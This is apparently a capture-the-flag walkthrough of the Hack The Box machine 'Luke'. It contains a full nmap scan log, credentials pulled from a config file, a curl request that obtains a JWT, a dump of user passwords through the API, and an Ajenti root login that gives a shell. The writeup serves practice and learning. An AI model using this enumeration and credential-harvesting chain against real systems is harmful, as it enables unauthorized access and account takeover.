```
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-26 18:09 IST
NSE: Loaded 148 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 18:09
Completed NSE at 18:09, 0.00s elapsed
Initiating NSE at 18:09
Completed NSE at 18:09, 0.00s elapsed
Initiating Ping Scan at 18:09
Scanning 10.10.10.137 [4 ports]
Completed Ping Scan at 18:09, 2.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:09
Completed Parallel DNS resolution of 1 host. at 18:09, 0.01s elapsed
Initiating SYN Stealth Scan at 18:09
Scanning 10.10.10.137 [1000 ports]
Discovered open port 22/tcp on 10.10.10.137
Discovered open port 80/tcp on 10.10.10.137
Discovered open port 21/tcp on 10.10.10.137
Increasing send delay for 10.10.10.137 from 0 to 5 due to 25 out of 82 dropped probes since last increase.
Increasing send delay for 10.10.10.137 from 5 to 10 due to 11 out of 34 dropped probes since last increase.
Discovered open port 3000/tcp on 10.10.10.137
Discovered open port 8000/tcp on 10.10.10.137
Increasing send delay for 10.10.10.137 from 10 to 20 due to max_successful_tryno increase to 4
Completed SYN Stealth Scan at 18:10, 42.52s elapsed (1000 total ports)
Initiating Service scan at 18:10
Scanning 5 services on 10.10.10.137
Completed Service scan at 18:12, 157.20s elapsed (5 services on 1 host)
Initiating OS detection (try #1) against 10.10.10.137
Retrying OS detection (try #2) against 10.10.10.137
Retrying OS detection (try #3) against 10.10.10.137
Retrying OS detection (try #4) against 10.10.10.137
Retrying OS detection (try #5) against 10.10.10.137
Initiating Traceroute at 18:13
Completed Traceroute at 18:13, 9.04s elapsed
Initiating Parallel DNS resolution of 1 host. at 18:13
Completed Parallel DNS resolution of 1 host. at 18:13, 0.01s elapsed
NSE: Script scanning 10.10.10.137.
Initiating NSE at 18:13
NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
Completed NSE at 18:13, 16.57s elapsed
Initiating NSE at 18:13
Completed NSE at 18:13, 1.03s elapsed
Nmap scan report for 10.10.10.137
Host is up (0.15s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3+ (ext.1)
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0             512 Apr 14 12:35 webapp
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.15.24
|      Logged in as ftp
|      TYPE: ASCII
|      No session upload bandwidth limit
|      No session download bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3+ (ext.1) - secure, fast, stable
|_End of status
22/tcp   open  ssh?
80/tcp   open  http    Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3
|_http-title: Luke
3000/tcp open  http    Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
8000/tcp open  http    Ajenti http control panel
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Ajenti
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=5/26%OT=21%CT=1%CU=40800%PV=Y%DS=2%DC=I%G=Y%TM=5CEA89F
OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=109%GCD=1%ISR=106%TI=Z%CI=Z%II=RI%TS=1F)S
OS:EQ(SP=103%GCD=1%ISR=10C%TI=Z%CI=Z%TS=20)OPS(O1=M54DNW6ST11%O2=M54DNW6ST1
OS:1%O3=M54DNW6NNT11%O4=M54DNW6ST11%O5=M54DNW6ST11%O6=M54DST11)WIN(W1=FFFF%
OS:W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFFF)ECN(R=Y%DF=Y%T=40%W=FFFF%O=M54DN
OS:W6SLL%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%
OS:T=40%W=FFFF%S=O%A=S+%F=AS%O=M54DNW6ST11%RD=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A
OS:%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y
OS:%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR
OS:%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RU
OS:CK=G%RUD=G)IE(R=Y%DFI=S%T=40%CD=S)

Uptime guess: 0.000 days (since Sun May 26 18:13:08 2019)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=244 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   147.24 ms 10.10.12.1
2   ... 30

NSE: Script Post-scanning.
Initiating NSE at 18:13
Completed NSE at 18:13, 0.00s elapsed
Initiating NSE at 18:13
Completed NSE at 18:13, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 245.44 seconds
           Raw packets sent: 1668 (78.012KB) | Rcvd: 1228 (52.902KB)
```

```
http://10.10.10.137/management (hidden portal)
http://luke.htb:8000/
http://10.10.10.137/login.php
http://10.10.10.137:3000/login
http://10.10.10.137:3000/users


http://luke.htb/config.php, Username: admin, pass: Zk6heYCyv6ZE9Xcg

> curl --header "Content-Type: application/json" --request POST --data '{"password":"Zk6heYCyv6ZE9Xcg", "username":"admin"}' http://10.10.10.137:3000/login


you will get token

{"success":true,"message":"Authentication successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU4OTgyNzY3LCJleHAiOjE1NTkwNjkxNjd9.yPCCUPOnAn11G24rK2gnfzNa2OE9UKI8sjE2oDIJZP0"}

It is Bearer user, use it like 

Get /users/
host: ip
Authorization: Bearer Tokenhere

[{"ID":"1","name":"Admin","Role":"Superuser"},{"ID":"2","name":"Derry","Role":"Web Admin"},{"ID":"3","name":"Yuri","Role":"Beta Tester"},{"ID":"4","name":"Dory","Role":"Supporter"}]

{"name":"Admin","password":"WX5b7)>/rp$U)FW"}
{"name":"Derry","password":"rZ86wwLvx7jUxtch"} /management
{"name":"Yuri","password":"bet@tester87"}
{"name":"Dory","password":"5y:!xa=ybfe)/QD"}

That credential will work in /management, then you will get config.json there you will get new credentials.
for Ajenti :8000

user = root
pass = KpMasng6S5EtTy9Z

There launch terminal, you will get root access as well as user access. :-)


```
